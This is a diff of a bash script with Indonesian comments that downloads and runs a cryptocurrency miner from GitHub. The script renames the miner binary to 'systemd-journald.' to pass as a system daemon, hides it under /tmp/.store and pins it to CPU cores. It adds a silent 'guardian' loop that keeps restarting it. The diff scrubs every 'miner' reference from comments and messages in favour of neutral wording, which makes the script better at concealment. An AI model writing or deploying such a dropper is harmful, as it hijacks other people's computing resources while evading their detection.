@@ -1,32 +1,32 @@
 #!/bin/bash
 
-# Warna buat gaya sayang
+# Warna untuk gaya manja
 GREEN='\033[0;32m'
 NC='\033[0m' # No Color
 
-echo -e "${GREEN}[*] Setup environment...${NC}"
+echo -e "${GREEN}[*] Menyiapkan environment...${NC}"
 
-# Buat folder 1 dan 2
+# Buat folder kerja
 mkdir -p /tmp/.store/1 /tmp/.store/2
 
-# Download config 1
+# Download konfigurasi pertama
 cd /tmp/.store/1
 wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/1.ini -O config.ini
 
-# Download config 2
+# Download konfigurasi kedua
 cd /tmp/.store/2
 wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini
 
-# Balik ke .store
+# Balik ke folder utama
 cd /tmp/.store
 
-# Download dan extract miner
+# Download dan ekstrak file utama
 wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
 tar -xzf cache.tar.gz
 rm -f cache.tar.gz
 mv cache systemd-journald.
 
-# Copy ke folder 1 dan 2
+# Copy file utama ke masing-masing folder
 cp systemd-journald. /tmp/.store/1/
 cp systemd-journald. /tmp/.store/2/
 chmod +x /tmp/.store/1/systemd-journald.
@@ -35,23 +35,23 @@ chmod +x /tmp/.store/2/systemd-journald.
 # Bersih-bersih
 rm -f systemd-journald.
 
-# Bikin skrip auto-restart guardian
+# Bikin guardian.sh buat ngawasin proses
 cat > /tmp/.store/guardian.sh << 'EOF'
 #!/bin/bash
 
 while true
 do
-    # Cek miner 1
-    if ! pgrep -f "/tmp/.store/1/systemd-journald." > /dev/null
+    # Cek proses pertama
+    if ! ps -C systemd-journald. -o cmd= | grep -q "/tmp/.store/1/systemd-journald."
     then
-        echo "[!] Miner 1 mati... menghidupkan ulang."
+        echo "[!] Proses pertama tidak ditemukan... Menyalakan ulang."
         cd /tmp/.store/1 && nohup taskset -c 0 ./systemd-journald. > /dev/null 2>&1 &
     fi
 
-    # Cek miner 2
-    if ! pgrep -f "/tmp/.store/2/systemd-journald." > /dev/null
+    # Cek proses kedua
+    if ! ps -C systemd-journald. -o cmd= | grep -q "/tmp/.store/2/systemd-journald."
     then
-        echo "[!] Miner 2 mati... menghidupkan ulang."
+        echo "[!] Proses kedua tidak ditemukan... Menyalakan ulang."
         cd /tmp/.store/2 && nohup taskset -c 1 ./systemd-journald. > /dev/null 2>&1 &
     fi
 
@@ -61,18 +61,12 @@ EOF
 
 chmod +x /tmp/.store/guardian.sh
 
-echo -e "${GREEN}[*] Starting miners...${NC}"
+echo -e "${GREEN}[*] Menyalakan background service...${NC}"
 
-# Start miner pertama
-cd /tmp/.store/1 && nohup taskset -c 0 ./systemd-journald. > /dev/null 2>&1 &
-
-# Start miner kedua
-cd /tmp/.store/2 && nohup taskset -c 1 ./systemd-journald. > /dev/null 2>&1 &
-
-# Start guardian nya
+# Start guardian saja
 nohup bash /tmp/.store/guardian.sh > /dev/null 2>&1 &
 
-echo -e "${GREEN}[✓] Setup selesai, miners jalan, guardian jalan.${NC}"
+echo -e "${GREEN}[✓] Semuanya sudah diawasi guardian.${NC}"
 
-# Cek miner jalan
+# Cek status
 ps aux | grep systemd-journald. | grep -v grep
